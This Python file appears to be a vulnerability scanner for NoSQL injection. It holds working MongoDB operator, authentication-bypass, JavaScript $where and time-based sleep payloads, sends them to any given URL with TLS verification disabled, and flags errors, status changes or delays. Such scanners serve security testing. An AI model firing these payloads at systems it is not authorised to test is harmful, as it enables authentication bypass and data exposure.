import requests
import json

# NoSQL injection payloads untuk MongoDB, CouchDB, etc.
NOSQL_PAYLOADS = [
    # MongoDB operator injection
    {"$ne": None},
    {"$ne": ""},
    {"$gt": ""},
    {"$regex": ".*"},
    {"$where": "1==1"},
    
    # String-based NoSQL injection
    "' || '1'=='1",
    "' || 1==1//",
    "admin' || 'a'=='a",
    
    # JSON injection
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    
    # JavaScript injection (MongoDB)
    "'; return true; var dummy='",
    "1; return true",
]

# Error signatures
NOSQL_ERRORS = [
    "mongodb",
    "couchdb",
    "cassandra",
    "redis",
    "dynamodb",
    "firestore",
    "cosmosdb",
    "syntax error",
    "query error",
    "invalid query",
    "bson",
]

def test_nosql_injection(url, params):
    """Test NoSQL injection vulnerabilities."""
    results = []
    
    for param in params:
        # Test 1: Operator injection via JSON
        for payload in NOSQL_PAYLOADS[:5]:
            test_params = params.copy()
            
            # Try as JSON
            if isinstance(payload, dict):
                test_params[param] = json.dumps(payload)
            else:
                test_params[param] = payload
            
            try:
                # Test GET
                response = requests.get(url, params=test_params, timeout=10, verify=False)
                body = response.text.lower()
                
                # Check for errors
                for error in NOSQL_ERRORS:
                    if error in body:
                        results.append({
                            "type": "NoSQL Injection (Error-based)",
                            "severity": "CRITICAL",
                            "param": param,
                            "payload": str(payload),
                            "detail": f"NoSQL error detected: '{error}'"
                        })
                        return results
                
                # Check for authentication bypass (status code change)
                normal_response = requests.get(url, params=params, timeout=10, verify=False)
                if response.status_code != normal_response.status_code:
                    if response.status_code in [200, 302] and normal_response.status_code in [401, 403]:
                        results.append({
                            "type": "NoSQL Injection (Auth Bypass)",
                            "severity": "CRITICAL",
                            "param": param,
                            "payload": str(payload),
                            "detail": f"Status changed: {normal_response.status_code} -> {response.status_code}"
                        })
                        return results
                
                # Check for data leakage (response size change)
                if len(response.text) > len(normal_response.text) * 2:
                    results.append({
                        "type": "Possible NoSQL Injection (Data Leak)",
                        "severity": "HIGH",
                        "param": param,
                        "payload": str(payload),
                        "detail": f"Response size increased significantly ({len(response.text)} bytes)"
                    })
                    
            except requests.RequestException:
                pass
        
        # Test 2: POST with JSON body
        for payload in NOSQL_PAYLOADS[:3]:
            if isinstance(payload, dict):
                test_data = params.copy()
                test_data[param] = payload
                
                try:
                    response = requests.post(
                        url,
                        json=test_data,
                        headers={"Content-Type": "application/json"},
                        timeout=10,
                        verify=False
                    )
                    
                    body = response.text.lower()
                    for error in NOSQL_ERRORS:
                        if error in body:
                            results.append({
                                "type": "NoSQL Injection (POST JSON)",
                                "severity": "CRITICAL",
                                "param": param,
                                "payload": str(payload),
                                "detail": f"NoSQL error in JSON POST: '{error}'"
                            })
                            return results
                except:
                    pass
    
    return results

def test_nosql_timing(url, params):
    """Test time-based NoSQL injection (MongoDB $where)."""
    results = []
    
    timing_payloads = [
        "'; sleep(5000); var dummy='",
        '{"$where": "sleep(5000)"}',
        "1; sleep(5000)",
    ]
    
    for param in params:
        for payload in timing_payloads:
            test_params = params.copy()
            test_params[param] = payload
            
            try:
                import time
                start = time.time()
                response = requests.get(url, params=test_params, timeout=10, verify=False)
                elapsed = time.time() - start
                
                if elapsed >= 4.5:  # 5 second delay with tolerance
                    results.append({
                        "type": "NoSQL Injection (Time-based)",
                        "severity": "CRITICAL",
                        "param": param,
                        "payload": payload,
                        "detail": f"Response delayed: {elapsed:.2f}s (expected: 5s)"
                    })
                    return results
            except:
                pass
    
    return results
